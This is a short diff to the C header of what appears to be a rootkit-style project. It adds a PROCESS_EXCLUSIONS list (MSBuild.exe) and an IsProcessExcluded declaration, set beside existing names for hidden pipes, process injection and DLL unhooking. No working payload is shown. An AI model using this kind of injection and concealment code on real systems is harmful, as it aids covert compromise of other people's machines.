@@ -71,6 +71,14 @@
 #define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"
 
 /// <summary>
+/// Specifies a list of processes that will not be injected.
+/// By default, this list includes processes that are known to cause problems.
+/// To customize this list, add custom entries and recompile.
+/// </summary>
+#define PROCESS_EXCLUSIONS						{ L"MSBuild.exe" }
+// Example: { L"MSBuild.exe", L"your_app.exe", L"another_app.exe" }
+
+/// <summary>
 /// A callback that notifies about a process ID.
 /// </summary>
 typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);
@@ -423,6 +431,15 @@ DWORD RvaToOffset(LPBYTE dll, DWORD rva);
 /// </summary>
 /// <param name="name">The name of the DLL to unhook.</param>
 VOID UnhookDll(LPCWSTR name);
+/// <summary>
+/// Determines whether the process is on the process exclusion list and should not be injected.
+/// </summary>
+/// <param name="processId">The process ID to check.</param>
+/// <returns>
+/// TRUE, if the process should not be injected;
+/// otherwise, FALSE.
+/// </returns>
+BOOL IsProcessExcluded(DWORD processId);
 
 /// <summary>
 /// Creates a new INTEGER_LIST.
